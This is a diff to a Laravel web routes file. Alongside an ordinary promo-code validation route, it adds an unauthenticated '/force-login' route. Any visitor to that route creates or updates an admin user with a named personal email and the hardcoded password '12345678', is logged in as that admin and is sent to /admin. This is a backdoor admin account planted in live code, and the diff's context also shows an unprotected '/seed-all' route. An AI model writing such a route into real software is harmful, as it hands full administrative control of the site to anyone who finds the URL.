@@ -43,6 +43,7 @@ Route::get('/seed-all', [App\Http\Controllers\SeedController::class, 'run']);
 
 Route::post('/submit-order', [App\Http\Controllers\OrderController::class, 'submitOrder']);
 Route::post('/submit-contact', [App\Http\Controllers\OrderController::class, 'submitContact']);
+Route::post('/api/validate-promo-code', [App\Http\Controllers\OrderController::class, 'validatePromoCode'])->name('promo.validate');
 
 Route::get('/booking', [App\Http\Controllers\BookingController::class, 'showCalendar']);
 Route::post('/submit-booking', [App\Http\Controllers\BookingController::class, 'submitBooking']);
@@ -53,3 +54,20 @@ Route::get('/api/booking-hours', [App\Http\Controllers\BookingController::class,
 // Route::get('/register', [App\Http\Controllers\Auth\RegisterController::class, 'show'])->name('register');
 // Route::post('/register', [App\Http\Controllers\Auth\RegisterController::class, 'register']);
 
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+
+Route::get('/force-login', function () {
+    $user = User::updateOrCreate(
+        ['email' => 'presiangrigorovdev@gmail.com'],
+        [
+            'name' => 'Presian',
+            'password' => Hash::make('12345678'),
+            'is_admin' => true,
+        ]
+    );
+    
+    Auth::login($user);
+    return redirect('/admin');
+});
